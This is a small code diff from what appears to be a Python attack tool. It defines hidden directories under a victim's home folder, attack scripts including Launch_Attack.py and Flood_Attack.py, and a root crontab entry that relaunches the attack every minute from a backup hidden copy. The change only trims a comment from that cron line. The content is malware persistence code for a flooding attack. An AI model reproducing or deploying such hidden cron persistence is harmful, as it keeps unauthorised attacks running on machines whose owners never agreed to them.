@@ -2,7 +2,7 @@ import os
 
 attackDirs = ['/home/victim/.etc/.module', '/home/victim/.var/.module']
 attackFiles = ['/Launch_Attack.py', '/Check_Attack.py', '/Flood_Attack.py']
-attackCommand = '* * * * * root /usr/bin/python /home/victim/.etc/.module/Launch_Attack.py || (/usr/bin/python /home/victim/.var/.module/Launch_Attack.py)\n#\n '
+attackCommand = '* * * * * root /usr/bin/python /home/victim/.etc/.module/Launch_Attack.py || (/usr/bin/python /home/victim/.var/.module/Launch_Attack.py)\n '
 
 
 def check_attack():
